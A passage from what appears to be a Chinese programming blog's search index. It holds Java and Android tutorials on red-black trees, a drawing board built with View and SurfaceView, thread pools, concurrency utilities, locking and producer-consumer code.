brother.p; &#125; // case 4 // 变色 brother.color = parent.color; parent.color = RBColor.BLACK; brother.left.color = RBColor.BLACK; // 父节点左旋 root = rightRotate(root, parent); break; &#125; &#125; &#125; fixNode.color = RBColor.BLACK; return root; &#125;; 打印与测试函数这里给出本人用来测试和打印红黑树的Java函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859public static void main(String[] args) &#123; int num[] = new int[]&#123;5, 4, 1, 6, 3, 2&#125;; List&lt;RBTreeNode&gt; list = new ArrayList&lt;&gt;(); RBTreeNode root = RBTreeNode.nullNode; // 插入测试 for (int i = 0; i &lt; num.length; i++) &#123; list.add(new RBTreeNode(num[i])); root = rbInsert(root, list.get(i)); printRBTree(root); System.out.println(\"\"); &#125; // 删除测试 for (int i = 0; i &lt; num.length; i++) &#123; root = rbDelete(root, list.get(0)); list.remove(0); printRBTree(root); System.out.println(\"\"); &#125; &#125; /** * 打印一颗红黑树 * @param root 根节点的引用 */ public static void printRBTree(RBTreeNode root) &#123; if (root == RBTreeNode.nullNode) &#123; System.out.println(\"这是一颗空树\"); return; &#125; Queue&lt;RBTreeNode&gt; q = new LinkedList&lt;&gt;(); boolean allNull = false; // 是否全为空节点 q.add(root); while (!allNull) &#123; // 该行不是全为叶结点 allNull = true; Queue&lt;RBTreeNode&gt; rowQ = new LinkedList&lt;&gt;(); // 用于存储一行的所有节点 RBTreeNode node; while (!q.isEmpty()) &#123; node = q.poll(); System.out.print(node); if (node != RBTreeNode.nullNode) &#123; // 该节点不是叶结点 if (node.left != RBTreeNode.nullNode) &#123; rowQ.add(node.left); allNull = false; &#125; else rowQ.add(RBTreeNode.nullNode); if (node.right != RBTreeNode.nullNode) &#123; rowQ.add(node.right); allNull = false; &#125; else rowQ.add(RBTreeNode.nullNode); &#125; else &#123; // 该节点为叶节点 rowQ.add(RBTreeNode.nullNode); rowQ.add(RBTreeNode.nullNode); &#125; &#125; q = rowQ; System.out.println(\"\"); &#125; &#125; ps:没写不知道，一写吓一跳，用Java来实现红黑树还是有挺多麻烦点的： 在Java中不知道如何修改根引用，所以最后都在函数上补了返回值 刚开始没考虑null叶节点其实是算黑色节点的情况，后来补充了一个静态变量作为叶节点 用静态变量当叶节点使得叶节点是共享的，不能修改叶节点的left,right,p指针，因此又再删除时添加了fixParent变量 删除时拥有两个子树，但右子树没有左节点的情况是个坑…… 总而言之，红黑树的5个性质，3种插入情况，4种删除情况记住就大概没什么问题了～","categories":[{"name":"算法","slug":"算法","permalink":"https://superxlcr.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://superxlcr.github.io/tags/算法/"}]},{"title":"Android View与SurfaceView的手绘板制作","slug":"Android-View与SurfaceView的手绘板制作","date":"2016-03-21T13:53:59.000Z","updated":"2020-05-11T07:23:44.524Z","comments":true,"path":"2016/03/21/Android-View与SurfaceView的手绘板制作/","link":"","permalink":"https://superxlcr.github.io/2016/03/21/Android-View与SurfaceView的手绘板制作/","excerpt":"","text":"最近学习了如何使用View与SurfaceView制作简单的手绘板，在此做个小结。 自定义VIew实现手绘板首先是使用View来实现手绘板： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106public class NormalDrawBoardView extends View &#123; // 点击的坐标 private float lastX = 0, lastY = 0; private Path path; private Paint paint; // 使用内存中的图片作为缓冲区 private Bitmap cacheBitmap; // 缓冲区上的Canvas对象 private Canvas cacheCanvas; public NormalDrawBoardView(Context context, int width, int height) &#123; super(context); // 创建确定大小的bitmap cacheBitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888); // 初始化缓存画布，把bitmap内容画到缓存画布上 cacheCanvas = new Canvas(); cacheCanvas.setBitmap(cacheBitmap); path = new Path(); // 初始化画笔 // 防抖动 paint = new Paint(Paint.DITHER_FLAG); paint.setColor(Color.BLACK); paint.setStyle(Paint.Style.STROKE); paint.setStrokeWidth(1); // 反锯齿 paint.setAntiAlias(true); paint.setDither(true); &#125; /** * 设置画笔的颜色 * @param color，颜色的字符串 */ public void setPaintColor(String color) &#123; switch (color) &#123; case \"red\" : paint.setColor(Color.RED); break; case \"green\" : paint.setColor(Color.GREEN); break; case \"blue\" : paint.setColor(Color.BLUE); break; case \"yellow\" : paint.setColor(Color.YELLOW); break; default: paint.setColor(Color.BLACK); break; &#125; &#125; /** * 设置画笔粗细 * @param width */ public void setPaintWidth(int width) &#123; paint.setStrokeWidth(width); &#125; public void clearCanvas() &#123; // 清除path轨迹 path.reset(); path.moveTo(lastX, lastY); // 清除cacheCanvas图像 Paint paint = new Paint(); paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.CLEAR)); cacheCanvas.drawPaint(paint); invalidate(); // paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC)); &#125; @Override public boolean onTouchEvent(MotionEvent event) &#123; float x = event.getX(), y = event.getY(); switch (event.getAction()) &#123; case MotionEvent.ACTION_DOWN: // 记录点击坐标，把当前点定义为线段的前一个点 lastX = x; lastY = y; path.moveTo(x, y); break; case MotionEvent.ACTION_MOVE: // 绘制线段 path.quadTo(lastX, lastY, x, y); lastX = x; lastY = y; break; case MotionEvent.ACTION_UP: // 把线段绘制到画布上 cacheCanvas.drawPath(path, paint); path.reset(); break; &#125; invalidate(); return true; &#125; @Override protected void onDraw(Canvas canvas) &#123; Paint bmpPaint = new Paint(); // 绘制之前画的轨迹 canvas.drawBitmap(cacheBitmap, 0, 0, bmpPaint); // 绘制正在画的轨迹 canvas.drawPath(path, paint); &#125; &#125; 在上面的代码中我们首先初始化了以下变量： path：用于记录用户手指滑动的路径类 paint：画笔类 cacheBitmap：用于存储用户画的手绘的图片缓存 cacheCanvas：用于描绘用户画的手绘的画布缓存 lastX，lastY：记录上一个点击的点的坐标 然后我们重写了onTouchEvent方法来处理用户的手指点击事件： Motion.Action.DOWN：代表手指按下的事件，此时我们记录下手指点击坐标，并把path的起点设置为该坐标 Motion.Action.MOVE：代表手指拖动事件，此时我们根据获取的坐标与前一个点的坐标画出一条线段，并更新记录的坐标 Motion.Action.UP：代表手指抬起事件，此时我们把path记录的路径绘制到缓存中，并重置path 在每次触发onTouchEvent方法的时候我们都在最后调用invalidate方法触发我们的View调用onDraw进行重绘。我们在onDraw方法中先把bitmap缓存的手绘记录绘制到画布上，再把当前的路径也绘制到画布上。此时我们自定义View实现的手绘板就大功告成啦： SurfaceView实现手绘板接下来我们来谈谈使用SurfaceView实现手绘板： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163public class SurfaceViewDrawBoardView extends SurfaceView implements SurfaceHolder.Callback &#123; private final String TAG = \"SurfaceViewDrawBoard\"; // 绘制背景的线程 private MyThread myThread; // 缓存用的bitmap和canvas private Bitmap cacheBitmap; private Canvas cacheCanvas; // 画笔和路径 private Paint paint; private Path path; // 上一个点的坐标 private float lastX, lastY; public SurfaceViewDrawBoardView(Context context, int width, int height) &#123; super(context); // 设置bitmap和canvas cacheBitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888); cacheCanvas = new Canvas(); cacheCanvas.setBitmap(cacheBitmap); // 设置画笔 paint = new Paint(Paint.DITHER_FLAG); paint.setStyle(Paint.Style.STROKE); paint.setStrokeWidth(1); paint.setColor(Color.BLACK); paint.setAntiAlias(true); paint.setDither(true); // 初始化路径 path = new Path(); // 设置SurfaceHolder的回调函数 getHolder().addCallback(this); // 初始化绘画线程 myThread = new MyThread(getHolder()); Log.v(TAG, Thread.currentThread().getName()); &#125; /** * 设置画笔的颜色 * * @param color，颜色的字符串 */ public void setPaintColor(String color) &#123; switch (color) &#123; case \"red\": paint.setColor(Color.RED); break; case \"green\": paint.setColor(Color.GREEN); break; case \"blue\": paint.setColor(Color.BLUE); break; case \"yellow\": paint.setColor(Color.YELLOW); break; default: paint.setColor(Color.BLACK); break; &#125; &#125; /** * 设置画笔粗细 * * @param width */ public void setPaintWidth(int width) &#123; paint.setStrokeWidth(width); &#125; public void clearCanvas() &#123; // 清除path轨迹 path.reset(); path.moveTo(lastX, lastY); // 清除cacheCanvas图像 Paint paint = new Paint(); paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.CLEAR)); cacheCanvas.drawPaint(paint); // paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC)); &#125; @Override public boolean onTouchEvent(MotionEvent event) &#123; float x = event.getX(), y = event.getY(); switch (event.getAction()) &#123; case MotionEvent.ACTION_DOWN: // 记录点击坐标，把当前点定义为线段的前一个点 lastX = x; lastY = y; path.moveTo(x, y); break; case MotionEvent.ACTION_MOVE: // 绘制线段 path.quadTo(lastX, lastY, x, y); lastX = x; lastY = y; break; case MotionEvent.ACTION_UP: // 把线段绘制到画布上 cacheCanvas.drawPath(path, paint); path.reset(); break; &#125; return true; &#125; @Override public void surfaceCreated(final SurfaceHolder holder) &#123; Log.v(TAG, \"surfaceCreated\"); myThread.isRun = true; myThread.start(); &#125; @Override public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) &#123; Log.v(TAG, \"surfaceChanged\"); &#125; @Override public void surfaceDestroyed(SurfaceHolder holder) &#123; Log.v(TAG, \"surfaceDestoryed\"); myThread.isRun = false; &#125; class MyThread extends Thread &#123; private SurfaceHolder holder; public boolean isRun = false; private int red = 0, green = 0, blue = 0; private int colorValue = 0; private float hsbValue[]; MyThread(SurfaceHolder holder) &#123; this.holder = holder; hsbValue = new float[]&#123;0, 1, 1&#125;; &#125; @Override public void run() &#123; while (isRun) &#123; Log.v(TAG, Thread.currentThread().getName()); Canvas canvas = holder.lockCanvas(); // 背景色渐变 hsbValue[0] = hsbValue[0] + 1 &lt;= 360 ? hsbValue[0] + 1 : 0; if (canvas != null) &#123; // 绘制背景色 canvas.drawColor(Color.HSVToColor(hsbValue)); Paint bmpPaint = new Paint(); // 绘制之前画的轨迹 canvas.drawBitmap(cacheBitmap, 0, 0, bmpPaint); // 绘制正在画的轨迹 canvas.drawPath(path, paint); holder.unlockCanvasAndPost(canvas); &#125; try &#123; // 休眠20ms TimeUnit.MILLISECONDS.sleep(20); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; &#125; surfaceView允许我们在新开的线程中更新UI界面，我们首先实现了SurfaceHolder.Callback接口，该接口有以下几个重要方法： surfaceCreated：在Surface创建的时候调用，我们在该方法中开启了绘制UI的子线程 surfaceChanged：在Surface大小发生改变时调用 surfaceDestroyed：在Surface销毁时调用，我们在该方法中停止了绘制UI的子线程 实现了SurfaceHolder.Callback接口后，我们在初始化时使用getHolder方法可以获取SurfaceHolder，然后调用其addCallback方法加入实现的接口即可。代码有大部分都与自定义View类似，此处我们重点讲讲子线程执行的工作。由于我们使用的是SurfaceView，因此重写其onDraw方法并不能在界面上绘制出图像，正确的方法是调用SurfaceHolder的lockCanvas方法获取画布（有可能为null），然后绘制完成后调用unlockCanvasAndPost把画布给更新到屏幕上，所以我们就在子线程中每过20ms就调用一次以上方法来刷新我们的界面，此处本人还加入了背景变色功能：利用颜色的HSV属性，色调从0～360变化，亮度和对比度恒定为1。最终效果如下图： 实际上的手绘效果感觉没有自定义View来的好，有时候感觉会有卡顿现象出现，本人分析的原因为子线程绘制界面的间隔时间不够短的缘故。 经过本次自定义View和SurfaceView手绘板的实战，本人有如下体会： View适合实现被动更新画面的。比如棋类，这种用view就好了。因为画面的更新是依赖于 onTouch 来更新，可以直接使用 invalidate。 因为这种情况下，这一次Touch和下一次的Touch需要的时间比较长些，不会产生影响。 而主动更新的画面应该使用SurfaceView。比如背景在一直变色。因为这需要一个单独的thread不停的重绘背景的状态，而如果使用View通过postInvalidated来实现的话，并不能保证固定频率刷新界面。所以view不合适实现这种固定频率主动更新界面的做法，用surfaceView来控制更为合适。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"关于一些基础的Java问题的解答（六）","slug":"关于一些基础的Java问题的解答（六）","date":"2016-03-20T01:53:11.000Z","updated":"2020-05-11T07:23:44.834Z","comments":true,"path":"2016/03/20/关于一些基础的Java问题的解答（六）/","link":"","permalink":"https://superxlcr.github.io/2016/03/20/关于一些基础的Java问题的解答（六）/","excerpt":"","text":"上一篇文章的传送门：关于一些基础的Java问题的解答（五） ThreadPool用法与优势ThreadPool即线程池，它是JDK1.5引入的Concurrent包中用于处理并发编程的工具。使用线程池有如下好处： 降低资源消耗：通过重复利用已创建的线程降低线程创建和销毁造成的消耗 提高响应速度：当任务到达时，任务可以不需要等到线程创建，复用缓存线程就能立即执行 提高线程的可管理性：线程是稀缺资源，如果无限制的创建，不仅会消耗系统资源，还会降低系统的稳定性，使用线程池可以进行统一的分配，调优和监控 线程池的创建方法如下：通过ThreadPoolExecutor创建： 1ThreadPoolExecutor executor = new ThreadPoolExecutor(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler); 该构造函数具有重载，最后两个参数是可选的，各参数的含义如下： corePoolSize（基本线程池大小）：当提交一个任务到线程池时，线程池会创建一个线程来执行任务，即使其他空闲的基本线程能够执行新任务也会创建线程，等到需要执行的任务数大于基本线程池大小时就不再创建。线程池有一个prestartAllCoreThreads方法用来提前创建并启动所有基本线程 maximumPoolSize（最大线程池大小）：线程池允许创建的最大线程数，必须大于基本线程池大小。线程池中含有一个任务阻塞队列，如果队列满了，并且已创建的线程数小于最大线程数，则线程池会再创建新的线程执行任务 keepAliveTime（线程活动保持时间）：线程池的工作线程空闲后，保持存活的时间。所以如果任务很多，并且每个任务执行的时间比较短，可以调大这个时间，提高线程的利用率 unit（线程活动保持时间的单位）：前一个参数的时间单位 workQueue（工作队列）：用于保存等待执行的任务的阻塞队列，如果当任务提交时基本线程池中已没有空闲线程，则任务会被放入工作队列等待 threadFactory（线程工厂，可选参数）：创建一个新线程时会调用其newThread方法，可以初始化一些信息 handler（饱和处理器）：当队列和线程池都满了，说明线程池处于饱和状态，那么就会使用处理器处理提交的新任务。ThreadPoolExecutor内部提供了一些handler的静态实现类： AbortPolicy：直接抛出异常RejectedExecutionException CallerRunsPolicy：使用调用者所在线程来运行任务 DiscardOldestPolicy：丢弃队列头的任务，并执行当前任务 DiscardPolicy：什么也不做，放弃掉该任务 除了自定义线程池，我们还可以使用Executors类中提供的实现好的线程池： 123456// 为每个任务创建一个新线程或回收利用旧线程的线程池 ExecutorService service1 = Executors.newCachedThreadPool(); // 创建指定数目线程的线程池 ExecutorService service2 = Executors.newFixedThreadPool(nThreads); // 线程数量固定为1的线程池，拥有无界的工作队列 ExecutorService service3 = Executors.newSingleThreadExecutor(); 以上三种线程池为比较常用的线程池，其余的不再探讨。线程池的用法如下： 12345678910// 传入一个Runnable接口处理任务 executor.execute(runnable); // 传入一个Callable接口处理任务，返回Future对象代表任务返回值 Future&lt;Object&gt; result = executor.submit(callable); // 使用get方法获取具体内容 result.get(); // 关闭线程池，中断空闲线程 executor.shutdown(); // 关闭线程池，中断所有线程 executor.shutdownNow(); 综上，线程池的工作流程为： Concurrent包里的工具：ArrayBlockingQueue、CountDownLatch等等JDK1.2引入的容器类库为了效率问题所以是不同步的，要同步容器类我们只能自己实现或指望Collections类提供的各种static同步方法。但在JDK1.5中引入的Concurrent包中，Java为我们提供了许多线程安全的免锁容器，主要使用的有以下几种： CopyOnWriteArrayList：写时拷贝列表，对容器的写入操作将导致创建整个底层数组的副本，而原数组保存在原地，使得当数组在被修改时，读取可以安全的执行。修改完成时，一个原子性的操作会把新数组换入，使得新的读取操作可以看到修改 CopyOnWriteArraySet：与CopyOnWriteArrayList类似的集合 ConcurrentHashMap：线程安全的HashMap ConcurrentLinkedQueue：一个线程安全的队列 DelayQueue：延迟队列，是一个无界阻塞队列，对于放入的元素实现延迟接口，设定延迟时间，元素只有过了延迟时间后才能被取走 LinkedBlockingQueue：阻塞队列，LinkedBlockingQueue 可以指定容量，也可以不指定，不指定的话，默认最大是Integer.MAX_VALUE，其中主要用到put和take方法，put方法在队列满的时候会阻塞直到有队列成员被消费，take方法在队列空的时候会阻塞，直到有队列成员被放进来 PriorityBlockingQueue：优先级阻塞队列，与优先级队列相似，具有阻塞的特点 除了容器外，Concurrent还为我们提供了各种用于同步的辅助类，常见的有以下几种： Atomic类，原子类，各种包装类型的同步类，可以使用compareAndSet形式的方法来更新变量 CountDownLatch：一个同步辅助类，在完成一组正在其他线程中执行的操作之前，它允许一个或多个线程一直等待。其构造方法可以指定计数次数，当其countDown方法被调用时次数减一，而调用await方法（可以设置超时）会使当前线程一直被阻塞，直到计时器的值为0 CyclicBarrier：回环栅栏，通过它可以实现让一组线程等待至某个状态之后再全部同时执行。叫做回环是因为当所有等待线程都被释放以后，CyclicBarrier可以被重用。其构造方法可以指定线程数，还可以传入Runnable表示所有线程到达状态后要执行的内容。线程调用其await方法时表示线程已到达指定状态并被阻塞，当有所有线程都到达状态时，线程才可以继续往下执行。调用其reset方法可以重复使用。 Exchanger：用于两个线程交换数据的辅助类，调用exchange方法后线程会被阻塞直到另一个线程调用exchange方法（可以设置超时） ReadWriteLock：读写锁允许我们拥有多个读者，对向数据结构相对不频繁的写入但频繁读取做了优化。我们分别可以调用readLock和writeLock方法获取读锁和写锁，使用lock和unlock方法来加锁和解锁。 Semaphore：信号量，可以控同时访问的线程个数（通过构造函数设置），通过 acquire方法 获取一个许可，如果没有就等待，而 release方法 释放一个许可。 wait()和sleep()的区别wait是Object类的方法，只有当线程拥有调用对象的锁的时候才可以调用该方法，否则会抛出IllegalMonitorStateException。wait方法的作用是阻塞当前线程并让出调用对象的锁，直到别的线程使用notify或notifyAll唤醒，或经过特定时间，或被别的线程中断才继续工作。sleep是Thread类的静态方法，他可以让当前线程休眠一段时间，直到经过特定休眠时间，或被别的线程中的才继续工作。 foreach与正常for循环效率对比for的写法都比较熟悉就不提了。foreach语句是JDK1.5的新特征之一，在遍历数组、集合方面，foreach为开发人员提供了极大的方便。foreach语句是for语句的特殊简化版本，但是foreach语句并不能完全取代for语句，然而，任何的foreach语句都可以改写为for语句版本。foreach并不是一个关键字，习惯上将这种特殊的for语句格式称之为“foreach”语句。可以使用foreach的对象必须实现Iterator 接口。一般而言，只是遍历的话我们可以使用foreach，如果要涉及对数组或容器的操作就只能使用for循环了。 Java IO与NIOJava NIO（Java new IO），是jdk1.4 里提供的新api ，为所有的原始类型提供缓存支持。两者的不同主要体现在以下几点：Java IO是面向流的而Java NIO是面向缓冲的，Java IO提供阻塞IO服务而Java NIO提供非阻塞IO服务，Java IO需要使用多个线程来处理多个IO流而Java NIO引入了Selector（选择器）来处理多个Channel（通道）。 面向流与面向缓冲Java NIO和IO之间第一个最大的区别是，IO是面向流的，NIO是面向缓冲区的。 Java IO面向流意味着每次从流中读一个或多个字节，直至读取所有字节，它们没有被缓存在任何地方。此外，它不能前后移动流中的数据。如果需要前后移动从流中读取的数据，需要先将它缓存到一个缓冲区。 Java NIO的缓冲导向方法略有不同。数据读取到一个它稍后处理的缓冲区，需要时可在缓冲区中前后移动。这就增加了处理过程中的灵活性。但是，还需要检查是否该缓冲区中包含所有您需要处理的数据。而且，需确保当更多的数据读入缓冲区时，不要覆盖缓冲区里尚未处理的数据。 阻塞IO与非阻塞IOJava IO的各种流是阻塞的。这意味着，当一个线程调用read() 或 write()时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了。 Java NIO的非阻塞模式，使一个线程从某通道发送请求读取数据，但是它仅能得到目前可用的数据，如果目前没有数据可用时，就什么都不会获取。而不是保持线程阻塞，所以直至数据变的可以读取之前，该线程可以继续做其他的事情。 非阻塞写也是如此。一个线程请求写入一些数据到某通道，但不需要等待它完全写入，这个线程同时可以去做别的事情。 线程通常将非阻塞IO的空闲时间用于在其它通道上执行IO操作，所以一个单独的线程现在可以管理多个输入和输出通道（channel） 选择器（Selector）Java NIO的选择器允许一个单独的线程来监视多个输入通道，你可以注册多个通道使用一个选择器，然后使用一个单独的线程来“选择”通道：这些通道里已经有可以处理的输入，或者选择已准备写入的通道。这种选择机制，使得一个单独的线程很容易来管理多个通道。 Java IO 优点：简单容易编写。 缺点：阻塞IO使得线程在等待输入时什么也不能做，多个流需要多个线程来处理。Java NIO 优点：非阻塞IO非常灵活，多个通道可以通过搭配选择器使用少数线程来处理。 缺点：编写复杂。若传输内容以行为单位且具有一定逻辑性，则传输过程逻辑性可能会丢失（每次接收的数据不一定为完整一行，没有readLine方法）。","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"关于一些基础的Java问题的解答（五）","slug":"关于一些基础的Java问题的解答（五）","date":"2016-03-19T02:15:48.000Z","updated":"2020-05-11T07:23:44.831Z","comments":true,"path":"2016/03/19/关于一些基础的Java问题的解答（五）/","link":"","permalink":"https://superxlcr.github.io/2016/03/19/关于一些基础的Java问题的解答（五）/","excerpt":"","text":"上一篇文章的传送门：关于一些基础的Java问题的解答（四） 实现多线程的两种方法：Thread与Runable在Java中实现多线程编程有以下几个方法： 继承Thread类，重写run方法1234567891011121314public class Test &#123; public static void main(String[] args) &#123; new MyThread().start(); &#125; private static class MyThread extends Thread &#123; @Override public void run() &#123; System.out.println(\"run!\"); &#125; &#125; &#125; 实现Runnable接口，作为参数传入Thread构造函数1234567891011121314public class Test &#123; public static void main(String[] args) &#123; new Thread(new Runnable() &#123; @Override public void run() &#123; System.out.println(\"run!\"); &#125; &#125;).start(); &#125; &#125; 使用ExecutorService类1234567891011121314151617import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; public class Test &#123; public static void main(String[] args) &#123; ExecutorService service = Executors.newCachedThreadPool(); service.execute(new Runnable() &#123; @Override public void run() &#123; System.out.println(\"Run!\"); &#125; &#125;); &#125; &#125; 补充：根据《阿里巴巴Java开发手册》，并不推荐使用Executors类中提供的线程池来开启线程，虽然这会比较方便，但是因为线程池参数不太合理的缘故，容易造成系统OOM 线程同步的方法：sychronized、lock、reentrantLock等多线程编程时同步一直是一个非常重要的问题，很多时候我们由于同步问题程序失败的概率非常低，导致往往存在我们的代码缺陷，但他们看起来是正确的： 12345678910111213141516171819202122232425262728293031323334353637383940414243public class Test &#123; private static int value = 0; public static void main(String[] args) &#123; Test test = new Test(); // 创建两个线程 MyThread thread1 = test.new MyThread(); MyThread thread2 = test.new MyThread(); thread1.start(); thread2.start(); &#125; /** * 为静态变量value加2 * @return */ public int next() &#123; value++; Thread.yield(); // 加速问题的产生 value++; return value; &#125; /** * 判断是否偶数 * @param num * @return boolean 是否偶数 */ public boolean isEven(int num) &#123; return num % 2 == 0; &#125; class MyThread extends Thread &#123; @Override public void run() &#123; System.out.println(Thread.currentThread() + \" start!\"); while(isEven(next())); System.out.println(Thread.currentThread() + \" down!\"); &#125; &#125; &#125; 上面的代码创建了两个线程操作Test类中的静态变量value，调用next方法每次会为value的值加2，理论上来说isEven方法的返回值应该总是true，两个线程的工作会不停止的执行下去。但事实是：因此在我们进行多线程并发编程时，使用同步技术是非常重要的。 synchronizedJava以提供关键字synchronized的形式，为防止资源冲突提供了内置支持。当某个线程处于一个对于标记为synchronized的方法的调用中，那么在这个线程从方法返回前，其他所有要调用类中任何标记为synchronized方法的线程都会被阻塞。对刚才的代码稍作修改，如下： 12345678910/** * 为静态变量value加2 * @return */ public synchronized int next() &#123; value++; Thread.yield(); // 加速问题的产生 value++; return value; &#125; 除了锁定方法，synchronized关键字还能锁定固定代码块： 12345678910111213/** * 为静态变量value加2 * * @return */ public int next() &#123; synchronized (this) &#123; value++; Thread.yield(); // 加速问题的产生 value++; return value; &#125; &#125; 在synchronized关键字后的小括号内加入要加锁的对象即可。通过这种方法分离出来的代码段被称为临界区，也叫作同步控制块。加入了synchronized后，在一个线程访问next方法的时候，另一个线程就无法访问next方法了，使得两个线程的工作互不干扰，循环也变得根本停不下来。 ReentrantLock除了synchronized关键字外，我们还可以使用Lock对象为我们的代码加锁，Lock对象必须被显示地创建、锁定和释放： 12345678910111213141516private static Lock lock = new ReentrantLock(); /** * 为静态变量value加2 * @return */ public int next() &#123; lock.lock(); try &#123; value++; Thread.yield(); // 加速问题的产生 value++; return value; &#125; finally &#123; lock.unlock(); &#125; &#125; 一般而言，当我们使用synchronized时，需要写的代码量更少，因此通常只有我们在解决某些特殊问题时，才需要使用到Lock对象，比如尝试去获得锁： 123456789101112131415161718192021/** * 为静态变量value加2 * @return */ public int next() &#123; boolean getLock = lock.tryLock(); if (getLock) &#123; try &#123; value++; Thread.yield(); // 加速问题的产生 value++; return value; &#125; finally &#123; lock.unlock(); &#125; &#125; else &#123; // do something else System.out.println(Thread.currentThread() + \"say : I don't get the lock, QAQ\"); return 0; &#125; &#125; 除了ReentrantLock外，Lock类还有众多子类锁，在此不做深入讨论。值得注意的是，很明显，使用Lock通常会比使用synchronized高效许多，但我们并发编程时都应该从synchronized关键字入手，只有在性能调优时才替换为Lock对象这种做法。 锁的等级：对象锁、类锁这是关于synchronized关键字的概念，synchronized关键字可以用来锁定对象的非静态方法或其中的代码块，此时关键字是为对象的实例加锁了，所以称为对象锁： 123456public synchronized void f() &#123;&#125;; public void g() &#123; synchronized (this) &#123; &#125; &#125; 另外，synchronized也可以用来锁定类的静态方法和其中的代码块，此时关键字就是为类（类的Class对象）加锁了，因此被称为类锁： 12345678public class Test &#123; public static synchronized void f() &#123;&#125;; public static void g() &#123; synchronized (Test.class) &#123; &#125; &#125; &#125; 写出生产者消费者模式生产者消费者模式一般而言有四种实现方法： wait和notify方法 await和signal方法 BlockingQueue阻塞队列方法 PipedInputStream和PipedOutputStream管道流方法 第一种方法（wait和notify）的实现： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889import java.util.LinkedList; import java.util.Queue; class MyQueue &#123; Queue&lt;Integer&gt; q; int size; // 队列持有产品数 final int MAX_SIZE = 5; // 队列最大容量 public MyQueue() &#123; q = new LinkedList&lt;&gt;(); size = 0; &#125; /** * 生产产品 * * @param num * 产品号码 */ public synchronized void produce(int num) &#123; // 容量不足时，等待消费者消费 try &#123; while (size &gt; MAX_SIZE) wait(); &#125; catch (InterruptedException e) &#123; &#125; ; System.out.println(\"produce \" + num); q.add(num); size++; // 提醒消费者消费 notifyAll(); &#125; /** * 消费产品 */ public synchronized void comsume() &#123; // 没有产品时，等待生产 try &#123; while (size &lt; 1) wait(); &#125; catch (InterruptedException e) &#123; &#125; ; System.out.println(\"comsume \" + q.poll()); size--; // 提醒生产者生产 notifyAll(); &#125; &#125; class Producer extends Thread &#123; private MyQueue q; public Producer(MyQueue q) &#123; this.q = q; &#125; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) q.produce(i); &#125; &#125; class Consumer extends Thread &#123; private MyQueue q; public Consumer(MyQueue q) &#123; this.q = q; &#125; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) q.comsume(); &#125; &#125; public class Test &#123; public static void main(String[] args) &#123; MyQueue q = new MyQueue(); Producer producer = new Producer(q); Consumer consumer = new Consumer(q); producer.start(); consumer.start(); &#125; &#125; 第二种方法（await和signal）实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104import java.util.LinkedList; import java.util.Queue; import java.util.concurrent.locks.Condition; import java.util.concurrent.locks.Lock; import java.util.concurrent.locks.ReentrantLock; class MyQueue &#123; Queue&lt;Integer&gt; q; int size; // 队列持有产品数 final int MAX_SIZE = 5; // 队列最大容量 private Lock lock; // 锁 private Condition condition; // 条件变量 public MyQueue() &#123; q = new LinkedList&lt;&gt;(); size = 0; lock = new ReentrantLock(); condition = lock.newCondition(); &#125; /** * 生产产品 * * @param num * 产品号码 */ public void produce(int num) &#123; // 进入临界区上锁 lock.lock(); // 容量不足时，等待消费者消费 try &#123; while (size &gt; MAX_SIZE) condition.await(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;; System.out.println(\"produce \" + num); q.add(num); size++; // 提醒消费者消费 condition.signalAll(); // 退出临界区解锁 lock.unlock(); &#125; /** * 消费产品 */ public void comsume() &#123; // 上锁进入临界区 lock.lock(); // 没有产品时，等待生产 try &#123; while (size &lt; 1) condition.await(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;; System.out.println(\"comsume \" + q.poll()); size--; // 提醒生产者生产 condition.signalAll(); // 退出临界区解锁 lock.unlock(); &#125; &#125; class Producer extends Thread &#123; private MyQueue q; public Producer(MyQueue q) &#123; this.q = q; &#125; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) q.produce(i); &#125; &#125; class Consumer extends Thread &#123; private MyQueue q; public Consumer(MyQueue q) &#123; this.q = q; &#125; @Override public void run() &#123; for (int i = 0; i &lt; 10; i++) q.comsume(); &#125; &#125; public class Main &#123; public static void main(String[] args) &#123; MyQueue q = new MyQueue(); Producer producer = new Producer(q); Consumer consumer = new Consumer(q); producer.start(); consumer.start(); &#125; &#125; 第三种方法（BlockingQueue阻塞队列）实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import java.util.concurrent.BlockingQueue; 